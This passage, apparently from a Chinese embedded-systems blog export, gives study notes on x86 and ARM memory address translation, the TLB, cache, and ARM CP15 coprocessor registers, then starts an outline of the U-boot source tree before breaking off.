Offset得到要访问的线性地址。所以可以看出，这样的访问方式适合于没有虚拟地址概念的OS，大家直接管理访问的都是线性地址。对于实现虚拟内存的，段页式更有效。(image source: Intel Manuals ) 段页式 资料中有一种是说尽量模仿纯页模式的映射方法：事实上本身应该是强调页模式，但是IA_32无法完全禁止段模式，但可以让其效果降低。最终效果事实上是段页式。方法是利用IA_32提供的“Basic Flat Model”在GDT定义两个段描述符:Code和Data Segment，两者都包含整个线性空间(Segment Limit = 4G, Kernel Segment)。Linux用这种方式，也就是说只使用了两个段，CS，DS每个进程的六个段寄存器值都相同，只有EIP(当前指令)、ESP(栈顶指针)不同。 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; 事实上上一步段式操作完成了虚拟到线性地址的映射，需要再做映射完成线性到物理地址的映射，完成本章节开始的第一个图的映射过程。过程是： 得到的线性地址是10 bit Directory Index + 10 bit Table Index + 12 bit Offset 如下图。 从CR3获取Page Directory基地址(每个进程有自己的控制块task_strcut，里面记录了自己C3的信息)找到Page Directory的位置。 以线性地址的前10bit为索引找到对应PDE(Page Directory Entry)含一个Page Table的地址。 以线性地址的第二个10 bit为索引找到PTE(Page Table Entry)含有要访问4KB Page Frame的地址。 根据20 bit Page Fram基地址与线性地址中Offset相加得到要访问的物理地址。 Two-level page table structure in x86 architecture (without PAE or PSE).(image source: http://ilinuxkernel.com/?p=1276 ) 返回来再看Linux的实现(只用两个段地址CS(赋值USER_CS)，DS/ES/SS(赋值USER_DS),FS/GS是0)。在程序/arch/x86/include/asm/segment.h中所赋值分别是： //文件中可以看到系统对于GDT的设计 #define GDT_ENTRY_DEFAULT_USER_CS 14 #define GDT_ENTRY_DEFAULT_USER_DS 15 #define __USER_DS (GDT_ENTRY_DEFAULT_USER_DS*8+3) #define __USER_CS (GDT_ENTRY_DEFAULT_USER_CS*8+3) //2.6.18内核的，笔者在自己给板子编译zImage的Linux 3.0.8的内核中查看有相同描述 得到的结果是： __USER_DS = 0000000001110 011 //index = 14, GDT __USER_CS = 0000000000111 011 //index = 15, GDT 它们被放入段寄存器中。通过5和6为Index找GDT中对应的段基址。那么GDT中的内容在哪里？段基址是多少？ 在2.6.18内核 /* * The Global Descriptor Table contains 28 quadwords, per-CPU. */ .align PAGE_SIZE_asm ENTRY(cpu_gdt_table) //中间略去下面是第14 15条 .quad 0x00cffa000000ffff / 0x73 user 4GB code at 0x00000000 / .quad 0x00cff2000000ffff / 0x7b user 4GB data at 0x00000000 / 根据上面Segment Descriptor的图的描述，找到对应的Base Address。 入用__USER_DS可以找到对应信息：BaseAddress是0，Limit是0xfffff。颗粒度标志G=1。表示Limit的单位是4KB。所以段的长度为0x0 ~ 0x8000 0000 -1。4G空间。代码段也是一样的。那么最后一个堆栈段上的变量的地址的效果就是 0(SS和DS段基地址一样) + Offset，逻辑地址的值就是线性地址的值。 发现一些内容找不到，在2.6.25内核后没有i386的文件夹，是x86。想问如何找到定义呢？ 在得到线性地址后在利用MMU做到物理地址的转化（为了使Linux能在32位和64位CPU上运行,就要采用统一的页面地址模型。从2.6.11内核开始,页面地址模型采用了4级页面）： 三、ARM地址映射原理ARM : VA - MVA – PA ARM(MVA-PA) = X86(虚拟地址-线性地址-物理地址) 1、地址变换过程VA - MVA 如果总是直接用VA做映射，如果两个进程所用的VA重叠，则切换进程为了把VA映射到不同PA，需要重建页表，这样引起的Cache 无效和MMU(其中的TLB)抖动带来很大开销。所以Kernel会用VA和PID(进程ID)建立MVA来方便进程切换，如果两个不同进程原本访问VA重叠，比如都用(0-32M空间)，但是经过PID的移位后就可以分开了。这样生成的MVA减少了进程切换的代价。芯片的CP15些处理器中register 13是识别进程的寄存器，PID写在[31:25]之后的[25:0]写为0。这样一来，能识别的进程最多2^7为128个，对应在4G虚拟空间就有每个进程32MB。 手册中:Addresses issued by the ARM9TDMI core in the range 0 to 32MB are translated by CP15 register 13, the ProcID register. Address A becomes A + (ProcID x 32MB). It is this translated address that is seen by both the Caches and MMU. Addresses above 32MB undergo no translation.表示出来，进程地址的转化就是：PA = VA + PID * 32MB 用这样方式，MMU和Cache使用MVA，就可以减少重建页表的开销。一些问题 ARM 用上述方式如果有大于32MB的程序呢？是错误吗。 MVA - PA得到MVA后喂到MMU做到物理地址的映射。过程如下： (image source: http://www.embedu.org/Column/Column583.htm ) 中间用到的地址： (image source: http://www.embedu.org/Column/Column583.htm ) 解释： CP15从C2寄存器获得页基地址(TTB, translation table base)，一级页表所在位置。要求16K对齐。 MVA高12bit作为索引值，对应TTB中的一个Entry。12 bit 也就是 4K个，每个Entry可以表示1MB的地址空间。 TTB + MVA[31:20]得到的Entry有三种: 1. &lt;div style=&quot;background: white&quot;&gt;&lt;span style=&quot;color:black&quot;&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;段页&lt;/span&gt;&lt;span style=&quot;font-family:微软雅黑&quot;&gt;(Section)&lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;描述符：指向一个&lt;/span&gt;&lt;span style=&quot;font-family:微软雅黑&quot;&gt;1MB&lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;物理空间描述符末两位&lt;/span&gt;&lt;span style=&quot;font-family:微软雅黑&quot;&gt; 0b10) 粗页(Coarse Page)描述符：有256个二级页表项，每个二级页表项代表4KB空间（理解：Entry指向的1MB空间中要存放32bit(4B)的描述符，可以放256个）(0b01) 细页(Fine Page)描述符：有1024个二级页表项，每个二级页表项代表1KB空间。(0b11) 还有一种是的得到的末两位为(0b00)没有对应Entry访问会产生fault 如果上一步指向Section，用MVA[19:0]作为索引可以找到1MB中对应请求的物理地址。 如果指向Coarse Page Table，根据MVA[19:12]做索引可以找到一个Entry，对应有两种情况： 1. &lt;div style=&quot;background: white&quot;&gt;&lt;span style=&quot;color:black&quot;&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;找到的是&lt;/span&gt;&lt;span style=&quot;font-family:微软雅黑&quot;&gt;Large Page Descriptor&lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;，对应一个&lt;/span&gt;&lt;span style=&quot;font-family:微软雅黑&quot;&gt;64KB&lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;大小的物理地址，不过由于之前提到每个粗页表项对应&lt;/span&gt;&lt;span style=&quot;font-family:微软雅黑&quot;&gt;4KB&lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;，所以有&lt;/span&gt;&lt;span style=&quot;font-family:微软雅黑&quot;&gt;16&lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;个&lt;/span&gt;&lt;span style=&quot;font-family:微软雅黑&quot;&gt;Descriptors&lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;对应这一个&lt;/span&gt;&lt;span style=&quot;font-family:微软雅黑&quot;&gt;Large Page Descriptor&lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;。再用&lt;/span&gt;&lt;span style=&quot;font-family:微软雅黑&quot;&gt;MVA[15:0]&lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;索引这个&lt;/span&gt;&lt;span style=&quot;font-family:微软雅黑&quot;&gt;64KB&lt;/span&gt;&lt;span style=&quot;font-family:宋体&quot;&gt;物理地址中的某个位置。&lt;/span&gt;&lt;span style=&quot;font-family:微软雅黑&quot;&gt; &lt;/span&gt;&lt;/span&gt;&lt;/div&gt; 找到的是Small Page Descriptor，对应一个4KB大小的物理地址，所以是1:1。再用MVA[11:0]索引这个Page Frame中的位置。 如果指向的是Fine Page Table，则用MVA[19:10]作为索引找到一个Entry，有相应三种情况，分别索引大页(Large Page)，小页(Small Page)，极小页(Tiny Page)，可以根据上图得知索引方式。 notificationsource: 《Linux设备驱动开发详解》（第二版），内容为读书笔记和网络资料，有些资料原始来源不详，分享为了方便自己和他人查阅。如有侵权请及时告知，对于带来的不便非常抱歉。转载请注明来源。个人所学有限，若有错误和不足还请不吝赐教，我会及时更正。Terrence Zhou.http://blog.csdn.net/ts_dchs 2、TLB 简介从虚拟地址到物理地址的转换过程可知：使用一级页表进行地址转换时，每次读/写数据需要访问两次内存，第一次访问一级页表获得物理地址，第二次才是真正的读/写数据：使用两级页表时，每次读/写数据需要访问3次内存，访问两次页表（一级页表和二级页表）获得物理地址，第三次才是真正的读/写数据。 上述的地址转换过程大大降低了CPU的性能，有没有办法改进呢？程序执行过程中，所用到的指令、数据的地址往往集中在一个很小的范围内，其中的地址、数据经常多次使用，这称为程序访问的布局性。由此，通过使用一个高速、容量相对较小的存储器来存储近期用到的页表条目（段/大页/小页/极小页描述符），以避免每次地址转换时都到主存去查找，这样可以大幅度地提高性能。这个存储器用来帮助快速地进行地址转换，称为&quot;转译查找缓存&quot;（Translation Lookaside Buffers, TLB）。 3、CACHE简介同样基于程序访问的局部性，在主存和CPU通用寄存器之间设置一个高速的、容量相对较小的存储器，把正在执行的指令地址附近的一部分指令或数据从主存调入这个存储器，供CPU在一段时间内使用，这对提高程序的运行速度有很大的作用。这个介于主存和CPU之间的高速小容量存储器称作高速缓存存储器（Cache）。 四、ARM内存管理单元MMU、TLB、Cache的控制指令1. 协处理器简介一个系统中最多可连接16个协处理器，每个协处理器都通过唯一的ID号标识。ARM7TDMI处理器包含两个 内部协处理器： CP14 通信通道协处理器 CP15 为cache和MMU功能提供的系统控制协处理器 因此，不能将外部协处理器的编号分配为14和15。ARM还保留了其他的协处理编号，见表： ![](http://www.madhex.com/wp-content/uploads/2017/02/021417_0222_S3C2440M14.png) 2. 协处理器指令S3C2410/S3C2440中，除了有一个ARM920T的CPU核外，还有若干个协处理器。协处理器也是一个微处理器，它被用来帮助CPU完成一些特殊功能，比如浮点计算等。对MMU、TLB、Cache等的操作就涉及协处理器。CPU核与协处理器间传送数据时使用这两条指令： &amp;lt;MCR|MRC&amp;gt;{cond} p#,&amp;lt;expressionl&amp;gt;,Rd,cn,cm{,&amp;lt;expression2&amp;gt;} MRC //从协处理器获得数据，传给ARM920T CPU核的寄存器 MCR //数据从ARM920T CPU核的寄存器传给协处理器 {cond} //执行条件，省略时表示无条件执行 p# //协处理器序号 &amp;lt;expression 1&amp;gt; //一个常熟 Rd //ARM920T CPU核的寄存器 cn和cm //协处理器中的寄存器 &amp;lt;expression 2&amp;gt; //一个常数 其中，&amp;lt;expression 1&amp;gt;、cn、cm、&amp;lt;expression 2&amp;gt; 仅供协处理器使用，它们的作用如何取决于具体的协处理器。 3. CP15协处理器详解在基于ARM的嵌入式系统中，存储系统通常是通过系统控制协处理器CP15完成的。 CP15可以包含16个32位的寄存器，其编号为0-15。实际上对于某些编号的寄存器可能对应有多个物理寄存器。在指令中指定特定的标志位来区分这些物理寄存器。有些类似于ARM寄存器中，处于不同的处理器模式时，ARM某些寄存器可能不同。 CP15 的寄存器列表如表所示： 寄存器编号基本作用在 MMU 中的作用在 PU 中的作用0ID 编码（只读）ID 编码和 cache 类型 1控制位（可读写）各种控制位 2存储保护和控制地址转换表基地址Cachability 的控制位3存储保护和控制域访问控制位Bufferablity 控制位4存储保护和控制保留保 留5存储保护和控制内存失效状态访问权限控制位6存储保护和控制内存失效地址保护区域控制7高速缓存和写缓存高速缓存和写缓存控制 8存储保护和控制TLB 控制保 留9高速缓存和写缓存高速缓存锁定 10存储保护和控制TLB 锁定保 留11保留 12保留 13进程标识符进程标识符 14保留 15因不同设计而异因不同设计而异因不同设计而异 注：以下寄存器中相应位的含义在不同的处理器中可能不同，但总体功能不变 （一）CP15 的寄存器 C0&lt;/span&gt; CP15中寄存器C0对应两个标识符寄存器，由访问CP15中的寄存器指令中的指定要访问哪个具体物理寄存器，与两个标识符寄存器的对应关系如下所示： opcode2 编码对应的标识符号寄存器0b000主标识符寄存器0b001cache类型标识符寄存器其 他保留 （1）主标识符寄存器 指令如下： MRC P15，0，R0，C0，C0，0 #将主标示符寄存器的内容读到AMR寄存器R0中 主标示符的编码格式对于不同的ARM处理器版本有所不同。 对于AMR7之后的处理器，其主标示符编码格式如下 ： 30 2423 2019 1615 43 0由生产商确定产品子编号ARM 体系版本号产品主编号处理器版本号 各部分的编码详细含义如下表所示： 位 说 明位 [3: 0]生产商定义的处理器版本号位 [15: 4]生产商定义的产品主编号 其中最高 4 位即位 [15:12] 可能的取值为0x0~0x7 但不能是 0x0 或 0x7因为： 0x0表示 ARM7之前的处理器 0x7 表示ARM7处理器位 [19: 16]ARM 体系的版本号，可能的取值如 下： 0x1 ARM 体系版本 40x2 ARM 体系版本 4T0x3 ARM 体系版本 50x4 ARM 体系版本 5T0x5 ARM 体系版本 5TE其他 由 ARM 公司保留将来使用位 [23: 20]生产商定义的产品子编号。当产品主编号相同时，使用子编号来区分不同的产品子类，如产品中不 同的高速缓存的大小等位 [31: 24]生产厂商的编号，现在已经定义的有以下值： 0x41 =A ARM 公司 0x44 =D Digital Equipment 公司 0x69 =I intel 公司 （2）cache类型标识符寄存器 指令如下： MRC P15，0，R0，C0，C0，1 #将cache类型标识符寄存器的内容读到AMR寄存器R0中 ARM 处理器中 cache 类型标识符寄存器的编码格式如下所示： 31 2928 252423 1211 0 000 属性字段 S 数据 cache 相关属性 指令cache 相关属性 各部分的编码详细含义如下表所示： 位含义位 [28: 25]主要用于定义对于写回类型的cache的一些属性位 [24]定义系统中的数据 cache 和指令 cache 是分开的还是统一的： 0 系统的数据 cache 和指令 cache 是统一的； 1 系统的数据 cache 和指令 cache 是分开的位 [23: 12]定义数据 cache 的相关属性 如果位 [24] 为 0 ，本字段定义整个cache 的属性位 [31: 24]定义指令 cache 的相关属性 如果位 [24] 为 0 ，本字段定义整个cache 的属性 控制字段位 [28 ： 25] 的含义&lt;/span&gt; 主要用于定义对于写回类型的cache的一些属性 cache 类型标识符寄存器的控制字段位 [28 ： 25]： 编 码cache 类型cache 内容清除方法cache 内容锁定方法0b0000写通类型不需要内容清除不支持内容锁定0b0001写回类型数据块读取不支持内容锁定0b0010写回类型由寄存器 C7 定义不支持内容锁定0b0110写回类型由寄存器 C7 定义支持格式 A0b0111写回类型由寄存器 C7 定义支持格式 B 控制字段位 [23 ： 12] 及控制字段位 [11 ： 0] 含义 [23：12]用于定义数据cache的属性，[11: 0]用于定义指令cache的属性 编码格式如下： 11 98 65 321 0000cache 容量cache 相联特性M块大小 其中bits[1:0]含义如下： 编 码cache 块大小0b002 个 字（ 8 字节）0b014 个 字（ 16 字节）0b108 个 字（ 32 字节）0b1116 个 字（ 64 字节） 其中bits[5:3]含义如下： 编 码M=0 时含义M=1 时含义0b0001 路 相联（直接映射）没有 cache0b0012 路 相联3 路 相联0b0104 路 相联6 路 相联0b0118 路 相联12 路 相联0b10016 路 相联24 路 相联0b10132 路 相联48 路 相联0b11064 路 相联96 路 相联0b111128 路相联192 路相联 其中bits[8:6]含义如下： 编 码M=0 时含义M=1时含义0b0000.5KB0.75 KB0b0011 KB1.5 KB0b0102 KB3 KB0b0114 KB6 KB0b1008 KB12 KB0b10116 KB24 KB0b11032 KB48 KB0b11164 KB96 KB （二）CP15 的寄存器 C1&lt;/span&gt; CP15中的寄存器C1是一个控制寄存器，它包括以下控制功能： 禁止或使能MMU以及其他与存储系统相关的功能 配置存储系统以及ARM处理器中的相关部分的工作 指令如下： mrc p15, 0, r0, c1, c0{, 0} ；将 CP15 的寄存器 C1 的值读到 r0 中 mcr p15, 0, r0, c1, c0{, 0} ；将 r0 的值写到 CP15 的寄存器 C1 中 CP15 中的寄存器 C1 的编码格式及含义说明如下： C1中的控制位含义M（bit[0]）0 ：禁止 MMU 或者 PU1 ：使能 MMU 或者 PU如果系统中没有MMU及PU，读取时该位返回0，写入时忽略该位A（bit[1]）0 ：禁止地址对齐检查 1 ：使能地址对齐检查C（bit[2]）当数据cache和指令cache分开时，本控制位禁止/使能数据cache。当数据cache和指令cache统一时，该控制位禁止/使能整个cache。 0 ：禁止数据 / 整个 cache1 ：使能数据 / 整个 cache如果系统中不含cache，读取时该位返回0.写入时忽略 当系统中不能禁止cache 时，读取时返回1.写入时忽略W（bit[3]）0 ：禁止写缓冲 1 ：使能写缓冲 如果系统中不含写缓冲时，读取时该位返回0.写入时忽略 当系统中不能禁止写缓冲时，读取时返回1.写入时忽略P（bit[4]）对于向前兼容26位地址的ARM处理器，本控制位控制PROG32控制信号 0 ：异常中断处理程序进入 32 位地址模式 1 ：异常中断处理程序进入26 位地址模式 如果本系统中不支持向前兼容26位地址，读取该位时返回1，写入时忽略D（bit[5]）对于向前兼容26位地址的ARM处理器，本控制位控制DATA32控制信号 0 ：禁止 26 位地址异常检查 1 ：使能 26 位地址异常检查 如果本系统中不支持向前兼容26位地址，读取该位时返回1，写入时忽略L（bit[6]）对于ARMv3及以前的版本，本控制位可以控制处理器的中止模型 0 ：选择早期中止模型 1 ：选择后期中止模型B（bit[7]）对于存储系统同时支持big-endian和little-endian的ARM系统，本控制位配置系统的存储模式 0 ： little endian1 ： big endian对于只支持little-endian的系统，读取时该位返回0，写入时忽略 对于只支持big-endian的系统，读取时该位返回1，写入时忽略S（bit[8]）在基于 MMU 的存储系统中，本位用作系统保护R（bit[9]）在基于 MMU 的存储系统中，本位用作 ROM 保护F（bit[10]）由生产商定义Z（bit[11]）对于支持跳转预测的ARM系统，本控制位禁止/使能跳转预测功能 0 ：禁止跳转预测功能1 ：使能跳转预测功能 对于不支持跳转预测的ARM系统，读取该位时返回0，写入时忽略I（bit[12]）当数据cache和指令cache是分开的，本控制位禁止/使能指令cache0 ：禁止指令 cache1 ：使能指令 cache如果系统中使用统一的指令cache和数据cache或者系统中不含cache，读取该位时返回0，写入时忽略。当系统中的指令cache不能禁止时，读取时该位返回1，写入时忽略V（bit[13]）对于支持高端异常向量表的系统，本控制位控制向量表的位置 0 ：选择低端异常中断向量 0x0~0x1c1 ：选择高端异常中断向量0xffff0000~ 0xffff001c对于不支持高端异常向量表的系统，读取时该位返回0，写入时忽略PR（bit[14]）如果系统中的cache的淘汰算法可以选择的话，本控制位选择淘汰算法 0 ：常规的 cache 淘汰算法，如随机淘汰1 ：预测性淘汰算法，如round-robin 淘汰算法 如果系统中cache的淘汰算法不可选择，写入该位时忽略。读取该位时，根据其淘汰算法是否可以比较简单地预测最坏情况返回0或者1L4（bit[15]）对于ARM版本5及以上的版本，本控制位可以提供兼容以前的ARM版本的功能 0 ：保持 ARMv5 以上版本的正常功能 1 ：将 ARMv5 以上版本与以前版本处理器 兼容，不根据跳转地址的 bit[0] 进行 ARM 指令和 Thumb 状态切换： bit[0] 等于 0 表示 ARM 指令，等于 1 表示 Thumb 指令Bits[31:16]）这些位保留将来使用，应为UNP/SBZP （三）CP15 的寄存器 C2&lt;/span&gt; C2寄存器的别名：Translation table base (TTB) register C2寄存器用来保存页表的基地址，即一级映射描述符表的基地址。其编码格如下所示： 31 0 一级映射描述符表的基地址（物理地址） （四）CP15 的寄存器 C3&lt;/span&gt; CP15 中的寄存器 C3 定义了 ARM 处理器的 16 个域的访问权限。 31 0D15D14D13D12D11D10D9D8D7D6D5D4D3D2D1D0 在 CP15的C3寄存器中，划分了 16个域，每个区域由两位构成，这两位说明了当前内存的检查权限： 00：当前级别下，该内存区域不允许被访问，任何的访问都会引起一个domain fault，这时 AP位无效 01：当前级别下，该内存区域的访问必须配合该内存区域的段描述符中AP位进行权检查10：保留状态（我们最好不要填写该值，以免引起不能确定的问题）11：当前级别下，对该内存区域的访问都不进行权限检查。 这时 AP位无效 所以只有当相应域的编码为 01 时，才会根据 AP位 和协处理器CP15中的C1寄存器的R,S位进行权限检查 （五）CP15 的寄存器 C5&lt;/span&gt; CP15 中的寄存器 C5 是失效状态寄存器，分为指令状态失效和数据状态失效。 MRC p15, 0, , c5, c0, 0 访问数据失效状态寄存器 MRC p15, 0, , c5, c0, 1 访问指令状态失效寄存器 编码格式如下所示： 31 987 43 0UNP/SBZP0域标识状态标识 其中，域标识bit[7:4]表示存放引起存储访问失效的存储访问所属的域。 状态标识 bit[3:0] 表示放引起存储访问失效的存储访问类型，该字段含义如下表所示（优先级由上到下递减）。 引起访问失效的原因状态标识域标识C6终 端异常（ Terminal Exception ）0b0010无 效生 产商定义中 断向量访问异常（ Vector Exception）0b0000无 效有 效地 址对齐0b00x1无 效有 效一 级页表访问失效0b1100无 效有 效二 级页表访问失效0b1110有 效有 效基 于段的地址变换失效0b0101无 效有 效基 于页的地址变换失效0b0111有 效有 效基 于段的存储访问中域控制失效0b1001有 效有 效基 于页的存储访问中域控制失效0b1101有 效有 效基 于段的存储访问中访问权限控制失效0b1111有 效有 效基 于页的存储访问中访问权限控制失效0b0100有 效有 效基 于段的 cache 预 取时外部存储系统失效0b0110有 效有 效基 于页的 cache 预 取时外部存储系统失效0b1000有 效有 效基 于段的非 cache 预 取时外部存储系统失效0b1010有 效有 效 （六）CP15 的寄存器 C6&lt;/span&gt; CP15 中的寄存器 C6 是失效地址寄存器，其中保存了引起存储访问失效的地址，分为数据失效地址寄存器和指令失效地址寄存器 MRC p15, 0, , c6, c0, 0 访问数据失效地址寄存器 MRC p15, 0, , c6, c0, 2 访问指令失效地址寄存器 编码格式如下所示： 31 0 失效地址（虚拟地址） （七）CP15 的寄存器 C7&lt;/span&gt; CP15 的 C7 寄存器用来控制 cache 和写缓存，它是一个只写寄存器，读操作将产生不可预知的后果。 访问 CP15 的 C7 寄存器的指令格式如下所示： mcr p15, 0, , , crm, ； 、 和 的不同取值组合，实现不同功能 表中的数据是指Rd中的数据： （八）CP15 的寄存器 C8&lt;/span&gt; 系统协处理器CP15的寄存器C8就是清除TLB内容的相关操作。它是一个只写的寄存器。 MCR p15，0，Rd，c8，CRm，opcode_2 Rd中为要写入C8寄存器的内容，CRm和opcode_2的不同组合决定指令执行的不同操作。 指令Rd含义MCR p15, 0, Rd, c8, c5, 0 0使无效整个指令TLBMCR p15, 0, Rd, c8, c5, 1 虚拟地址使无效指令TLB中的单个地址变换条目MCR p15, 0, Rd, c8, c6, 0 0使无效整个数据TLBMCR p15, 0, Rd, c8, c6, 1 虚拟地址使无效数据TLB中的单个地址变换条目MCR p15, 0, , c8, c7, 0 0使无效整个数据和指令TLBMCR p15, 0, , c8, c7, 1 虚拟地址使无效数据和指令TLB中的单个地址变换条目 （九）CP15 的寄存器 C12CP15寄存器C12用来设置异常向量基地址，其编码格式如下所示： MCR p15, 0, , c12, c0, 0 ；Rd中存放要修改的异常向量基地址 31 54 0异常向量基地址Reserve 注：只有ARM11和cortex-a 可以任意修改异常向量基地址。arm7,ARM9,ARM10只可以在0地址或0xffff0000中 （十）CP15 的寄存器 C13CP15中的寄存器C13用于快速上下文切换。其编码格式如下所示。 访问寄存器C13的指令格式如下所示。 MCR p15, 0,,,c0,0 MRC P15, 0,,,c0,0 其中， 在读操作时，结果中位[31：:25]返回PID，其他位 的数值是不可以预知的。写操作将设置PID的值。 当PID的值为0时，MVA = VA | (0（PID）&lt;&lt;25)，MVA=VA,相当于禁止了FCSE。系统复位后PID即为0. 当PID的值不为0时，相当于使能了FCSE。 五、ARM内存管理单元MMU操作实例关闭缓存 disable_caches: /*******flush I/Dcaches and mmu*****/ mcr p15, 0, r0, c7, c7, 0 mrc p15, 0, r0, c1, c0, 0 bic r0, r0, #0x00000007 mcr p15, 0, r0, c1, c0, 0 mov pc, lr reference特别感谢：Linux内存地址映射 的资料，向前辈们学习。[1] Linux地址地址映射，http://blog.chinaunix.net/uid-20528014-id-314322.html[2] Linux内核高端内存，http://ilinuxkernel.com/?p=1013[3] x86寄存器简介，http://blog.csdn.net/shrekmu/article/details/8588341[4] 8086寄存器介绍，比较认真，http://www.cnblogs.com/zhaoyl/archive/2012/05/15/2501972.html[5] Intel® 64 and IA-32 Architectures Software Developer Manuals，http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html[6] Page Table，https://en.wikipedia.org/wiki/Page_table[7] MMU，寄存器，s3c2410，http://blog.csdn.net/WINITZ/article/details/4057495","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"U-boot源码整体框架","slug":"EMBEDDED/U-boot源码整体框架","date":"2016-11-29T03:07:33.000Z","updated":"2017-07-10T08:51:45.288Z","comments":true,"path":"EMBEDDED/U-boot源码整体框架.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/U-boot源码整体框架.html","excerpt":"1. # U-boot源码整体框架 源码解压以后，我们可以看到以下的文件和文件夹： cpu","text":"# U-boot源码整体框架 源码解压以后，我们可以看到以下的文件和文件夹： &lt;/span&gt;&lt;/span&gt; cpu 与处理器相关的文件。每个子目录中都包括cpu.c和interrupt.c、start.S、u-boot.lds。 cpu.c初始化CPU、设置指令Cache和数据Cache等 interrupt.c设置系统的各种中断和异常 start.S是U-boot启动时执行的第一个文件，它主要做最早其的系统初始化，代码重定向和设置系统堆栈，为进入U-boot第二阶段的C程序奠定基础 u-boot.lds链接脚本文件，对于代码的最后组装非常重要 &lt;span style=&quot;color:red; font-size:12pt&quot;&gt;**&lt;span style=&quot;font-family:Arial&quot;&gt; &lt;/span&gt;&lt;span style=&quot;font-family:幼圆&quot;&gt;board&lt;/span&gt;**&lt;/span&gt; &lt;span style=&quot;font-family:幼圆; font-size:12pt&quot;&gt;已经支持的所有开发板相关文件，其中包含&lt;span style=&quot;color:red&quot;&gt;SDRAM初始化代码、Flash底层驱动、板级初始化文件&lt;/span&gt;。 其中的config.mk文件定义了TEXT_BASE，也就是代码在内存的其实地址，非常重要。 &lt;span style=&quot;color:red; font-size:12pt&quot;&gt;**&lt;span style=&quot;font-family:Arial&quot;&gt; &lt;/span&gt;&lt;span style=&quot;font-family:幼圆&quot;&gt;common&lt;/span&gt;**&lt;/span&gt; &lt;span style=&quot;font-family:幼圆; font-size:12pt&quot;&gt;与处理器体系结构无关的通用代码，U-boot的命令解析代码/common/command.c、所有命令的上层代码&lt;span style=&quot;color:red&quot;&gt;**cmd_*.c**&lt;/span&gt;、U-boot环境变量处理代码env_*.c、等都位于该目录下&lt;/span&gt; &lt;span style=&quot;color:red; font-family:幼圆; font-size:12pt&quot;&gt;**drivers**&lt;/span&gt; &lt;span style=&quot;font-family:幼圆; font-size:12pt&quot;&gt;包含几乎所有外围芯片的驱动，&lt;span style=&quot;color:red&quot;&gt;网卡&lt;/span&gt;、USB、串口、LCD、Nand Flash等等&lt;/span&gt; &lt;span style=&quot;font-family:幼圆&quot;&gt;&lt;span style=&quot;font-size:10pt&quot;&gt;disk&lt;/span&gt;&lt;span style=&quot;font-size:12pt&quot;&gt; &lt;/span&gt;&lt;/span&gt; fs net &lt;span style=&quot;font-family:幼圆; font-size:12pt&quot;&gt;支持的CPU无关的重要子系统： 磁盘驱动的分区处理代码 文件系统：FAT、JFFS2、EXT2等 网络协议：NFS、TFTP、RARP、DHCP等等 &lt;span style=&quot;color:red; font-family:幼圆; font-size:12pt&quot;&gt;**include**&lt;/span&gt; &lt;span style=&quot;font-family:幼圆; font-size:12pt&quot;&gt;头文件，包括各&lt;span style=&quot;color:red&quot;&gt;CPU的寄存器定义&lt;/span&gt;，文件系统、网络等等 configs子目录下的文件是与目标板相关的配置头文件 &lt;span style=&quot;font-family:幼圆; font-size:10pt&quot;&gt;doc&lt;/span&gt; &lt;span style=&quot;font-family:幼圆; font-size:12pt&quot;&gt;U-Boot的说明文档，在修改配置文件的时候可能用得上&lt;/span&gt; &lt;span style=&quot;color:red; font-family:幼圆; font-size:12pt&quot;&gt;**lib_arm**&lt;/span&gt; &lt;span style=&quot;font-family:幼圆; font-size:12pt&quot;&gt;处理器体系相关的初始化文件 比较重要的是其中的board.c文件，几乎是U-boot的所有架构第二阶段代码入口函数和相关初始化函数存放的地方。 &lt;span style=&quot;font-family:幼圆&quot;&gt;&lt;span style=&quot;font-size:10pt&quot;&gt;lib_avr32&lt;/span&gt;&lt;span style=&quot;font-size:12pt&quot;&gt; &lt;/span&gt;&lt;/span&gt; lib_blackfin lib_generic lib_i386 lib_m68k lib_microblaze &lt;span style=&quot;font-family:幼圆&quot;&gt;&lt;span style=&quot;font-size:10pt&quot;&gt;lib_mips lib_nios&lt;/span&gt;&lt;span style=&quot;font-size:12pt&quot;&gt; &lt;/span&gt;&lt;/span&gt; lib_nios2 lib_ppc lib_sh lib_sparc &lt;span style=&quot;font-family:Arial; font-size:10pt&quot;&gt; &lt;/span&gt;&lt;span style=&quot;font-family:幼圆&quot;&gt;&lt;span style=&quot;font-size:10pt&quot;&gt;api&lt;/span&gt;&lt;span style=&quot;font-size:12pt&quot;&gt; &lt;/span&gt;&lt;/span&gt; examples &lt;span style=&quot;font-family:幼圆; font-size:12pt&quot;&gt;外部扩展应用程序的API和范例&lt;/span&gt; &lt;span style=&quot;font-family:幼圆&quot;&gt;&lt;span style=&quot;font-size:10pt&quot;&gt;nand_spl&lt;/span&gt;&lt;span style=&quot;font-size:12pt&quot;&gt; &lt;/span&gt;&lt;/span&gt; onenand_ipl post &lt;span style=&quot;font-family:幼圆; font-size:12pt&quot;&gt;一些特殊构架需要的启动代码和上电自检程序代码&lt;/span&gt; &lt;span style=&quot;color:black; font-family:幼圆; font-size:10pt&quot;&gt;libfdt&lt;/span&gt; &lt;span style=&quot;font-family:幼圆; font-size:12pt&quot;&gt;支持平坦设备树(flattened device trees)的库文件&lt;/span&gt; &lt;span style=&quot;color:black; font-family:幼圆; font-size:10pt&quot;&gt;tools&lt;/span&gt; &lt;span style=&quot;font-family:幼圆; font-size:12pt&quot;&gt;编译S-Record或U-Boot映像等相关工具，制作bootm引导的内核映像文件工具&lt;span style=&quot;color:red&quot;&gt;mkimage&lt;/span&gt;源码就在此&lt;/span&gt; &lt;span 